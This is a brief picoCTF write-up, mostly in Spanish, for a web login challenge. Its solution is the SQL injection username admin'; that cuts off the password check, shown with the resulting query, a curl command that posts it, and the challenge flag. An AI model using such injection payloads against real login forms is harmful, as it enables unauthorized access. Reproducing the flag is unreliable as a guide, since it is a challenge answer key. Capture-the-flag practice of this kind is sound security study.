
## Descripción

There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

## Pistas

The password is being filtered.

## Solución

```python()
Mediante la propia página web:
username: admin';
password: dsfdsdf
SQL query: SELECT * FROM users WHERE name='admin';' AND password='dsfdsdf'
En linux sería:
curl -s tps://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=hola&debug=1"   
```

## Bandera
picoCTF{m0R3_SQL_plz_c34df170}

## Notas adicionales